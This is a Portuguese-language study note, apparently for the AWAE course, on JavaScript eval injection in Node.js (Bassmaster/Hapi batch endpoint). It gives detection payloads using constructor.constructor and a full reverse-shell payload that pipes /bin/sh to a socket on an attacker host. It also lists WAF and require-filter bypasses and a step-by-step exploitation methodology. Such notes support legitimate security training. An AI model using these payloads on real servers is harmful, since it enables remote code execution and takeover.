---
title: "Node.js Injection"
---

# Node.js — Eval Injection (JS Runtime Injection)

> AWAE Ch.6 (Bassmaster) — injeção direta no runtime V8 via construção dinâmica de string com input do usuário, sem intermediação de template engine.

---

## Distinção: JS Injection vs SSTI

| | JS Injection | SSTI |
|--|--|--|
| **Engine** | V8 runtime diretamente | Template engine (Jinja2, Twig, EJS...) |
| **Trigger** | Input concatenado em string e avaliado dinamicamente | Input renderizado dentro de template |
| **Linguagem** | JavaScript puro | Sintaxe da template engine |
| **Indicadores** | Stack trace Node.js, `X-Powered-By: Express` | Stack trace do engine (TemplateSyntaxError, etc.) |
| **Payload** | Expressões JS | Sintaxe `{{ }}`, `<%= %>`, `${...}` |

---

## Padrão Vulnerável — Bassmaster (AWAE Ch.6)

Aplicação Hapi.js com endpoint de requisições em lote ("batch"). O handler avalia dinamicamente referências entre requisições usando notação de ponto:

```
POST /batch
{
  "requests": [
    { "method": "GET", "path": "/users/1" },
    { "method": "GET", "path": "/users/{0}.name" }  ← input do usuário
  ]
}
```

Internamente, o código constrói e avalia dinamicamente uma expressão como:
```
value = ref.USERINPUT
```

onde `USERINPUT` é controlado pelo atacante. Qualquer expressão JS válida após o ponto é executada no contexto Node.js.

---

## Identificação

**Headers indicadores:**
```
X-Powered-By: Express
X-Powered-By: Hapi
```

**Stack traces Node.js em respostas de erro** — revelam estrutura interna:
```
SyntaxError: Unexpected token
    at Object.exports.runInNewContext (vm.js:...)
    at /app/node_modules/bassmaster/lib/batch.js:...
```

**Parâmetros com notação de ponto** — qualquer campo que aceite `{N}.campo`:
- Batch APIs
- Template de rota com referências a respostas anteriores
- Query builders que avaliam expressões

---

## Detecção

Payloads para confirmar execução:

```
# aritmética — resultado diferente de literal confirma execução
{0}.constructor.constructor("return 1+1")()
→ resposta deve conter "2"

# typeof — confirma contexto JS
{0}.constructor.constructor("return typeof process")()
→ retorna "object"

# process.version — fingerprint do Node
{0}.constructor.constructor("return process.version")()
→ retorna "v14.x.x"
```

---

## Escalada para RCE

Via módulos nativos Node.js acessíveis através de `require`:

```javascript
// spawn de processo filho + pipe para socket TCP (reverse shell)
// estrutura conceitual:
require('child_process').spawn('/bin/sh', []).stdio → conectar em socket TCP

// variante com net module:
var net = require('net');
var sp = require('child_process').spawn('/bin/sh', []);
var sock = new net.Socket();
sock.connect(PORT, 'ATTACKER');
sock.pipe(sp.stdin);
sp.stdout.pipe(sock);
sp.stderr.pipe(sock);
```

No contexto de injeção (payload em batch request):
```
{0}.constructor.constructor("var net=require('net'),sp=require('child_process').spawn('/bin/sh',[]),s=new net.Socket();s.connect(PORT,'IP');s.pipe(sp.stdin);sp.stdout.pipe(s);sp.stderr.pipe(s)")()
```

---

## Restrições Comuns e Bypasses

**Filtro de `require`:**
```javascript
// acessar via process.mainModule quando require está bloqueado
process.mainModule.require('child_process')

// ou via constructor chain:
global.process.binding('spawn_sync')
```

**Sandbox `vm.runInNewContext`:**
- Sandbox Node.js não é isolamento real
- `this.constructor.constructor` escapa para contexto global
- `process` frequentemente acessível mesmo em sandbox

**WAF bloqueando palavras-chave:**
- Usar concatenação de strings: `'chil'+'d_process'`
- Hex encoding de nomes de módulos
- Acessar via `Object.keys(process.binding('natives'))`

---

## Metodologia

```
1. Identificar headers X-Powered-By: Express/Hapi/Node
2. Mapear endpoints com parâmetros de referência cruzada ({N}.campo)
3. Injetar aritmética simples → confirmar execução (≠ literal)
4. Ler process.version / process.env para fingerprint
5. Tentar require('child_process') → spawn reverse shell
6. Fallback: process.mainModule.require() se require bloqueado
```

---

## Ferramentas

| Ferramenta | Uso |
|-----------|-----|
| Burp Repeater | Testar payloads iterativamente |
| Burp Comparer | Diferenciar respostas para oracle booleano |
| `curl -d` | Testar manualmente JSON batch |
| node REPL local | Prototipar payloads antes de enviar |
